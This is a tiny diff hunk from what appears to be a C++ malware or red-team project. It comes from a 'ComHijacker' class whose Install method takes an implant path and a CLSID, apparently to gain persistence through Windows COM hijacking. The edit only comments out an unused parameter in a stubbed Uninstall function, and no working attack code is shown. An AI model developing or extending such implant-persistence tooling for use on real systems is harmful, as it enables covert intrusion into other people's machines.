@@ -69,7 +69,7 @@ bool ComHijacker::Install(const std::string& implantPath, const std::string& cls
     return NT_SUCCESS(status);
 }
 
-bool ComHijacker::Uninstall(const std::string& clsid) {
+bool ComHijacker::Uninstall(const std::string& /*clsid*/) {
     // Syscall for NtDeleteKey is more complex. Stubbing for now.
     return true;
 }
